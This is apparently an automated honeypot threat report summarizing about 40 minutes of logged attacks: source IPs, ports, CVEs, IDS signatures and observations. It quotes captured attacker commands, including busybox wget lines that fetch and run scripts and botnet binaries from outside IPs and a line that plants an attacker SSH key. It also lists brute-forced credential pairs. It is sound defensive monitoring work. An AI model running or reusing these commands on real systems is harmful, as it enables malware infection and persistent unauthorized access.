Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-20T13:01:33Z
**Timeframe:** 2025-10-20T12:20:01Z to 2025-10-20T13:01:33Z

**Files Used to Generate Report:**
- agg_log_20251020T122001Z.json
- agg_log_20251020T124001Z.json
- agg_log_20251020T130001Z.json

**Executive Summary:**
This report summarizes honeypot activity over a period of approximately 40 minutes, based on data from three log files. A total of 20,560 attacks were recorded across various honeypots. The most targeted services were Honeytrap, Cowrie, and Dionaea. The majority of attacks originated from the IP address 45.134.20.151. Attackers attempted to exploit a range of vulnerabilities, with a focus on older CVEs. Multiple commands were executed on compromised systems, primarily aimed at downloading and executing malicious scripts.

**Detailed Analysis:**

**Attacks by Honeypot:**
- Honeytrap: 11761
- Cowrie: 4606
- Dionaea: 1049
- Suricata: 1337
- Sentrypeer: 560
- Mailoney: 906
- Tanner: 54
- Adbhoney: 30
- H0neytr4p: 37
- Redishoneypot: 37
- ConPot: 82
- Ciscoasa: 25
- Miniprint: 53
- ElasticPot: 4
- Dicompot: 9
- Heralding: 4
- Ipphoney: 2
- Honeyaml: 4

**Top Attacking IPs:**
- 45.134.20.151: 4806
- 64.227.11.241: 3735
- 68.183.102.75: 1253
- 72.146.232.13: 1200
- 45.171.150.123: 886
- 8.209.85.186: 495
- 209.38.96.194: 369
- 185.243.5.158: 239
- 107.170.36.5: 242
- 198.12.68.114: 201
- 47.239.184.132: 148
- 57.129.61.16: 189
- 205.185.125.150: 174
- 118.193.38.97: 109
- 88.214.50.58: 97

**Top Targeted Ports/Protocols:**
- 5038: 4806
- 22: 1020
- 445: 965
- 5060: 560
- 25: 906
- 5903: 219
- 8333: 152
- 5901: 121
- 15672: 34
- TCP/80: 53
- 80: 46
- 443: 22
- 4443: 27
- 11211: 53
- 9100: 53
- 6379: 27
- 4444: 86
- 27019: 34
- TCP/1433: 19

**Most Common CVEs:**
- CVE-2002-0013, CVE-2002-0012
- CVE-2002-0013, CVE-2002-0012, CVE-1999-0517
- CVE-2015-2051, CVE-2019-10891, CVE-2024-33112, CVE-2025-11488, CVE-2022-37056
- CVE-2021-3449
- CVE-2019-11500
- CVE-2006-2369
- CVE-2024-12847
- CVE-2023-52163
- CVE-2023-31983
- CVE-2024-10914
- CVE-2009-2765
- CVE-2005-4050

**Commands Attempted by Attackers:**
- `uname -s -v -n -r -m`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `echo -e "admin\n..."|passwd|bash`
- `Enter new UNIX password:`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `top`
- `uname`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; ...`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic
- ET HUNTING RDP Authentication Bypass Attempt
- ET SCAN Suspicious inbound to Oracle SQL port 1521
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28
- ET CINS Active Threat Intelligence Poor Reputation IP group 98
- ET INFO CURL User Agent
- ET SCAN Sipsak SIP scan
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32
- ET INFO curl User-Agent Outbound

**Users / Login Attempts:**
- root/AdAnAc223!2015T
- root/12345
- operator/operator12
- root/adb123adb
- dev/dev123456
- vagrant/vagrant
- root/Adirika123
- pos/pos
- user/Wangsu@123456

**Files Uploaded/Downloaded:**
- wget.sh;
- w.sh;
- c.sh;
- arm.urbotnetisass;
- arm5.urbotnetisass;
- arm6.urbotnetisass;
- arm7.urbotnetisass;
- x86_32.urbotnetisass;
- mips.urbotnetisass;
- mipsel.urbotnetisass;
- ?format=json
- welcome.jpg)
- writing.jpg)
- tags.jpg)
- soap-envelope
- addressing
- discovery
- devprof
- soap:Envelope>

**HTTP User-Agents:**
- No user agents recorded.

**SSH Clients:**
- No SSH clients recorded.

**SSH Servers:**
- No SSH servers recorded.

**Top Attacker AS Organizations:**
- No AS organizations recorded.

**Key Observations and Anomalies:**
- The high number of attacks from a single IP (45.134.20.151) suggests a targeted or automated campaign.
- The commands executed indicate a clear pattern of reconnaissance, followed by attempts to download and execute malware. The use of `wget` and `curl` to fetch scripts from remote servers is a common tactic.
- The presence of commands to manipulate SSH keys (`.ssh/authorized_keys`) indicates attempts to establish persistent access.
- A significant portion of the attacks are scans, as shown by the triggered Suricata signatures (e.g., "ET SCAN NMAP").
- The variety of targeted ports and services indicates a broad-spectrum approach by attackers, hoping to find any vulnerable service.
- The CVEs targeted are relatively old, suggesting that attackers are targeting unpatched or legacy systems.
This report provides a snapshot of the threat landscape as observed by the honeypots. Continuous monitoring is recommended to track these and other emerging threats.